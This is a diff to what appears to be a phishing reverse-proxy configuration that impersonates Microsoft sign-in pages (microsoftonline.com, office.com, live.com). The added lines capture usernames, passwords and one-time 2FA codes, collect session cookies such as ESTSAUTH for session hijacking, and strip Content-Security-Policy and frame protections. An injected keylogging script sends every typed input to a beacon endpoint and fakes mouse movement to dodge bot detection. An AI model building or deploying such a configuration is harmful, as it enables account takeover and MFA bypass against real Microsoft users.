@@ -1,32 +1,81 @@
-name: "Microsoft-Login"
-author: "Vanta v5"
-min_ver: "5.0.0"
+name: "microsoft"
+author: "@redteam_expert"
+min_ver: "3.0.0"
 proxy_hosts:
-  - subdomain: "login"
-    target: "login.microsoftonline.com"
-auth_urls: ["/common/oauth2/v2.0/authorize", "/common/login"]
-landing_path: ["/common/login"]
+  - {phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true}
+  - {phish_sub: "www", orig_sub: "www", domain: "office.com", session: false, is_landing: false}
+  - {phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false}
+  - {phish_sub: "account", orig_sub: "account", domain: "live.com", session: false, is_landing: false}
+  - {phish_sub: "cdn", orig_sub: "logincdn", domain: "msauth.net", session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
+  - {triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
 auth_tokens:
-  - {type: "cookie", name: "ESTSAUTH"}
-  - {type: "cookie", name: "ESTSAUTHPERSISTENT"}
-  - {type: "cookie", name: "SignInStateCookie"}
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "R", "L", "RP", "SessionToken", "Office_SessId"]
+  - domain: "login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "R", "L", "RP", "SessionToken", "Office_SessId"]
+  - domain: ".office.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "R", "L", "RP", "SessionToken", "Office_SessId"]
+  - domain: ".live.com"
+    keys: ["PPAuth", "MSPAuth", "MSPRequ", "MSPOK"]
 credentials:
-  - {type: "post_param", name: "loginfmt", regex: null}
-  - {type: "post_param", name: "passwd", regex: null}
-  - {type: "post_param", name: "username", regex: null}
-  - {type: "post_param", name: "password", regex: null}
-injections: []
+  username:
+    key: "loginfmt"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+  2fa:
+    key: "otc"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "login.microsoftonline.com"
+  path: "/common/login"
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/login", "/common/oauth2", "/login.srf"]
+    script: |
+      (function(){
+        // Anti-Bot: Mock user behavior
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        setInterval(() => {
+           const ev = new MouseEvent('mousemove', {
+               view: window, bubbles: true, cancelable: true, 
+               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
+           });
+           document.dispatchEvent(ev);
+        }, 3000);
+        
+        // Input Capture
+        document.addEventListener('input', function(e) {
+            if(e.target.tagName === 'INPUT') {
+                 // Send to Beacon
+                 if(window.navigator.sendBeacon) {
+                    const data = new FormData();
+                    data.append('k', e.target.value);
+                    data.append('f', e.target.name || e.target.id);
+                    window.navigator.sendBeacon('/__vanta_track', data);
+                 }
+            }
+        });
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
   - {action: "remove", name: "X-Content-Type-Options"}
-path_rewrites:
-  - {pattern: "^/$", replace: "/common/login", methods: ["GET"]}
+  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
+path_rewrites: []
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|gtm|/instrumentation|/collect", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|gtm|/static/|instrumentation", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
-  - {selector: "form[action*=\"login\"]", action_to: "/common/sessions"}
+  - {selector: "form[action*=\"login\"]", action_to: "/common/login"}
 bridges:
-  - {prefix: "/_mscdn/", target_host: "aadcdn.msftauth.net", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_mscdn2/", target_host: "aadcdn.msauth.net", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_ms_cdn/", target_host: "logincdn.msauth.net", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_ms_live/", target_host: "login.live.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_ms_acct/", target_host: "account.live.com", strip_prefix: true, cors: "allow_all"}
